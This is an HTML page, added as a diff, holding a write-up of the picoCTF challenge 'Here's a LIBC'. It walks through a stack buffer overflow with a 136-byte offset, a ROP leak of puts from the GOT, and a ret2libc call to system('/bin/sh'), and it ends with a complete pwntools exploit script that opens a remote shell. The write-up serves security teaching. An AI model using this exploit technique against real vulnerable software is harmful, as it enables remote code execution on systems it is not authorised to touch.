@@ -1,0 +1,145 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Here's a LIBC Writeup</h1>
+            <h2>June 2021</h2>
+            <h4>Ret2libc Got leak</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+        I am once again asking for you to pwn this binary <a href=../../docs/pico/heres_a_libc>heres_a_libc</a> <a href=../../docs/pico/libc.so.6>libc.so.6</a>nc mercury.picoctf.net 49464
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to and retrieve the flag from using the developed exploit. We are also given a libc that we can use to access libc symbols. 
+        <br>
+    	Before starting we use a tool called ctfmate to automatically download the linkger for the provided libc, and patch it into the binary so that the binary uses this libc instead of our own systems libc. This tool can be found here: https://github.com/X3eRo0/CTFMate
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall5_1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br>
+        Now that that is done, we can start working on an exploit. Running the binary, it prints out a line, and then asks us for input. Our input is then echo'd back to us. This seems to run on a loop. 
+        <br> 
+        Supplying a big enough input overflows, and results in a segmentation fault. 
+        <br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall5_2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Using a cyclic pattern we can easily figure out that the offset to overwrite ret is 136 bytes. This means that after supplying 136 bytes of input, we control the return address and can thus take control of the program. 
+        <br> 
+        The binary is compiled without pie. This means that we can make use of the gadgets in the binary without having to worry about needing a leak. Sadly there do not appear to be enough gadgets to spawn a shell. This means that we need to produce our own libc leak. 
+        <br>
+        We will do this using the below code. First we provide 136 bytes of padding. Next we pop puts_got into rdi to print it out to our terminal using puts_plt. Finally we call main again to prevent the binary from crashing and give us a chance to cause another overflow, just this time with a libc leak.
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+rop = ROP([elf])
+
+PUTS_PLT = p64(elf.plt['puts'])
+PUTS_GOT = p64(elf.got['puts'])
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+main = p64(elf.sym['main'])
+
+payload1 = b'A'*136 + pop_rdi + PUTS_GOT + PUTS_PLT + main
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Since we now have a libc leak, the rest of the exploit is trivia. We pop the address of '/bin/sh' into rdi and call system to spawn a shell. This allows us to retrieve the flag. The completed exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall5_3.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = 'mercury.picoctf.net'
+    port = 49464
+    p = remote(host,port)
+    
+rop = ROP([elf])
+
+PUTS_PLT = p64(elf.plt['puts'])
+PUTS_GOT = p64(elf.got['puts'])
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+main = p64(elf.sym['main'])
+
+payload1 = b'A'*136 + pop_rdi + PUTS_GOT + PUTS_PLT + main
+
+p.clean()
+p.sendline(payload1)
+
+p.recvline()
+a = p.recv(120)
+data = p.clean().strip()[2:-27]
+leak = u64(data.ljust(8,b"\x00"))
+print("Leak = " + str(hex(leak)))
+
+libc.address = leak - libc.sym['puts']
+binsh = p64(next(libc.search(b'/bin/sh\x00')))
+system = p64(libc.sym['system'])
+ret = p64(rop.find_gadget(['ret'])[0])
+
+payload2 = b'A'*136 + pop_rdi + binsh + ret + system
+
+p.clean()
+p.sendline(payload2)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
